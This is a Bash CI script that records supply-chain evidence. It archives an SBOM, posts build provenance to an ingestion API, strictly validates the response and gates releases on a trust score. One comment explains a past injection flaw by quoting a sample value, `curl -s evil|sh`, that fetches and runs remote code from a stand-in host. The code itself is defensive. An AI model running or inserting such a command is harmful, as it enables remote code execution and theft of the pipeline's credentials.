#!/usr/bin/env bash
# Supply-chain evidence for the Atlas capability. Refs: #42
#
# Runs on `ensure:`, so a scan that failed still records what it managed to see
# rather than leaving the repo with stale evidence and no sign of it.
set -euo pipefail

: "${MYKRONOS_INGESTION_URL:?MYKRONOS_INGESTION_URL is required}"
: "${MYKRONOS_INGESTION_TOKEN:?MYKRONOS_INGESTION_TOKEN is required}"
: "${MYKRONOS_REF:?MYKRONOS_REF is required}"

python -m pip install --quiet --disable-pip-version-check \
  "mykronos @ git+https://github.com/ToddGBenson/mykronos@${MYKRONOS_REF}#subdirectory=backend"

COMMIT_SHA="$(git -C repo rev-parse HEAD)"

# ── Archive the SBOM ──────────────────────────────────────────────────────────
# Keyed on the file existing rather than on repeating the "should we build one"
# condition. Two copies of the same condition is how they come to disagree, and
# the failure mode is a curl against a file that is not there.
# Archiving is best-effort and must NOT be able to suppress the evidence record
# below. In Actions these were two steps — "Archive the SBOM" and "Report
# supply-chain evidence" with `if: always()` — so an archive failure could not
# stop the report. Collapsing them into one script under `set -e` lost that
# independence: a 5xx from /api/ingest/raw aborted the script before the
# /api/ingest/atlas POST, leaving stale evidence and no sign of it. Restored
# explicitly.
SBOM_REF=""
if [ -f sbom/sbom.json ]; then
  if ! SBOM_REF="$(curl --fail --silent --show-error --max-time 60 \
    -X POST "${MYKRONOS_INGESTION_URL}/api/ingest/raw?scan_run_id=${BUILD_ID:-unknown}&filename=sbom.json" \
    -H "Authorization: Bearer ${MYKRONOS_INGESTION_TOKEN}" \
    -H "Content-Type: application/octet-stream" \
    --data-binary @sbom/sbom.json \
    | python3 -c 'import json, sys
# Tolerant on purpose. curl --fail already decides whether the archive
# succeeded; when it fails the body is empty and json.load raised a traceback
# that printed ABOVE the warning explaining what happened — so the loudest thing
# in the log was a stack trace for a condition the script handles.
try:
    print(json.load(sys.stdin).get("raw_output_ref", ""))
except Exception:
    print("")')"; then
    echo "WARNING: could not archive the SBOM. Continuing so the evidence record" >&2
    echo "still lands — it will simply carry no sbom_ref." >&2
    SBOM_REF=""
  fi
fi

# ── Is this build a release? ──────────────────────────────────────────────────
# The Actions version read github.event.release.tag_name, which is only set when
# a release event fired the run. Concourse has no such signal: the
# `github-release` resource hands us the LATEST release on every build, so
# trusting it blindly would stamp every routine main-branch build with a tag it
# does not belong to.
#
# Comparing the release commit against the commit under scan is a fact we can
# actually check, so that is what decides it. No tag is claimed unless this build
# is genuinely at the release commit.
TAG=""
IS_RELEASE="false"
if [ -f github-release/commit_sha ] && [ -f github-release/tag ]; then
  release_sha="$(cat github-release/commit_sha)"
  if [ "${release_sha}" = "${COMMIT_SHA}" ]; then
    TAG="$(cat github-release/tag)"
    IS_RELEASE="true"
    echo "This build is at release ${TAG}."
  fi
fi

# ── Counts, not a score ───────────────────────────────────────────────────────
# The trust formula lives in the platform so it is reproducible and cannot drift
# between pipeline versions.
if [ -f osv-json/osv.json ]; then
  ECOSYSTEMS="$(python -m mykronos.atlas_counts osv-json/osv.json)"
else
  echo "WARNING: no osv.json — the scan did not complete. Reporting empty counts" >&2
  echo "so this run still registers, rather than leaving stale evidence in place." >&2
  ECOSYSTEMS='{}'
fi

# Provenance names Concourse, because that is what built it. Keeping the old
# `github-actions` builder_id would have made every record here a false
# statement about where the artifact came from.
BODY="$(
  ECOSYSTEMS="${ECOSYSTEMS}" \
  COMMIT_SHA="${COMMIT_SHA}" \
  TAG="${TAG}" \
  SBOM_REF="${SBOM_REF}" \
  REPO_SLUG="${REPO_SLUG}" \
  python3 - <<'PY'
import json, os, platform

body = {
    "commit_sha": os.environ["COMMIT_SHA"],
    "ecosystems": json.loads(os.environ["ECOSYSTEMS"] or "{}"),
    "provenance": {
        "builder_id": "concourse",
        "source_repo": os.environ.get("REPO_SLUG", ""),
        "source_commit": os.environ["COMMIT_SHA"],
        "build_run_id": os.environ.get("BUILD_ID", ""),
        "runner": f"{platform.system()}-{platform.machine()}",
        "workflow": "{}/{}".format(
            os.environ.get("BUILD_PIPELINE_NAME", ""),
            os.environ.get("BUILD_JOB_NAME", ""),
        ),
    },
}
if os.environ.get("TAG"):
    body["tag_or_release"] = os.environ["TAG"]
if os.environ.get("SBOM_REF"):
    body["sbom_ref"] = os.environ["SBOM_REF"]

print(json.dumps(body))
PY
)"

curl --fail --silent --show-error --max-time 60 \
  -X POST "${MYKRONOS_INGESTION_URL}/api/ingest/atlas" \
  -H "Authorization: Bearer ${MYKRONOS_INGESTION_TOKEN}" \
  -H "Content-Type: application/json" \
  -d "${BODY}" > evidence.json

# ── DO NOT SOURCE THIS RESPONSE ───────────────────────────────────────────────
# The first version wrote `KEY=value` lines and ran `. ./evidence.env`, which
# executes the ingestion API's response body as shell: a field containing
# `0\nX=$(curl -s evil|sh)` runs in this container, which holds the Mykronos
# token. PD-6 — fetched content is data, never instruction. The Actions original
# read the same six fields with `jq -r` into variables, so the port introduced
# this.
#
# Values are now read positionally and each is validated against the shape it is
# meant to have. A response that does not match is a broken or hostile server,
# and either way must not degrade quietly into a gate that cannot fire.
#
# The parse runs in its own command substitution with its exit status CHECKED.
# Inlining it directly into the here-doc below does not trip errexit, so a
# rejected response produced six empty variables and the gate silently could not
# fire — the validation reported the problem and nothing acted on it.
if ! PARSED="$(python3 - <<'PY'
import json, re, sys

doc = json.load(open("evidence.json"))
NUMERIC = re.compile(r"^-?\d+(\.\d+)?$")


def scalar(key, kind):
    value = doc.get(key)
    if kind == "bool":
        text = str(value).lower()
        if text in ("true", "false"):
            return text
        print(f"ERROR: {key} is not a boolean: {value!r}", file=sys.stderr)
        sys.exit(1)
    if value is None:
        # Absent numerics are reported as a sentinel rather than "" so the
        # comparisons below cannot silently become no-ops on a schema change.
        return "none"
    text = str(value).strip()
    if not NUMERIC.match(text):
        print(f"ERROR: {key} is not numeric: {value!r}", file=sys.stderr)
        sys.exit(1)
    return text


print(
    scalar("trust_score", "num"),
    scalar("min_trust_score", "num"),
    scalar("below_minimum", "bool"),
    scalar("blocking", "bool"),
    scalar("dependency_count", "num"),
    scalar("vulnerable_dependency_count", "num"),
)
PY
)"; then
  echo "ERROR: the ingestion API response did not parse as expected." >&2
  echo "The supply-chain gate cannot evaluate, so this is not a pass." >&2
  exit 1
fi

read -r TRUST_SCORE MIN_TRUST_SCORE BELOW_MINIMUM BLOCKING \
        DEPENDENCY_COUNT VULNERABLE_DEPENDENCY_COUNT <<EOF
${PARSED}
EOF

# Absent numerics arrive as the sentinel "none" rather than "", so a schema
# change cannot quietly turn the comparisons below into no-ops.
#
# ── A NULL TRUST SCORE IS NOT ALWAYS AN ERROR ────────────────────────────────
# The platform returns trust_score=null DELIBERATELY when dependency_count is 0
# (backend/mykronos/atlas.py, spec 07 §5a). It used to return 100 there — the
# same answer a repository with four hundred clean dependencies gets, for a scan
# that inspected nothing — and that was false assurance, so it now declines to
# score rather than inventing one.
#
# This guard originally failed on ANY null, and was therefore wrong for exactly
# the repository it runs on: keel declares no dependencies, so "not assessed" is
# the correct answer and the lane went red for receiving it. Guarding against a
# silent no-op is right; treating the platform's honesty as a fault is not.
#
# The distinction: null WITH dependencies is a broken contract and must fail.
# Null WITHOUT dependencies is the platform being honest, and must be reported
# loudly rather than either failing or passing quietly.
if [ "${TRUST_SCORE}" = "none" ]; then
  if [ "${DEPENDENCY_COUNT}" = "0" ]; then
    cat <<'EOF'

================================================================================
SUPPLY CHAIN: NOT ASSESSED

This repository resolved no dependencies, so there is no concrete version set to
check advisories against, and the platform declined to score it.

This is NOT a trust score of 100 and NOT a clean bill of health. It is a
statement that nothing was assessed. It becomes a real score the moment a
lockfile or a pinned manifest exists.
================================================================================

EOF
    exit 0
  fi
  echo "ERROR: ${DEPENDENCY_COUNT} dependencies were reported but no trust score" >&2
  echo "came back. That is a broken response, not an empty repository, so the" >&2
  echo "supply-chain gate cannot evaluate. This is not a pass." >&2
  exit 1
fi

if [ "${MIN_TRUST_SCORE}" = "none" ]; then
  echo "ERROR: a trust score came back with no repository floor to compare against." >&2
  exit 1
fi

echo "Supply-chain trust: ${TRUST_SCORE}/100 (${VULNERABLE_DEPENDENCY_COUNT} vulnerable of ${DEPENDENCY_COUNT} dependencies)"
echo "Repository floor: ${MIN_TRUST_SCORE}"

# With blocking on, a release below the floor fails. Only a release — failing a
# routine build because a transitive dependency has an advisory nobody on this
# commit introduced is how this capability gets switched off.
if [ "${BLOCKING}" = "true" ] && [ "${BELOW_MINIMUM}" = "true" ] && [ "${IS_RELEASE}" = "true" ]; then
  echo "ERROR: trust score ${TRUST_SCORE} is below this repository's floor of ${MIN_TRUST_SCORE}." >&2
  exit 1
fi

if [ "${BELOW_MINIMUM}" = "true" ]; then
  echo "WARNING: trust score ${TRUST_SCORE} is below this repository's floor of ${MIN_TRUST_SCORE} (advisory)."
fi
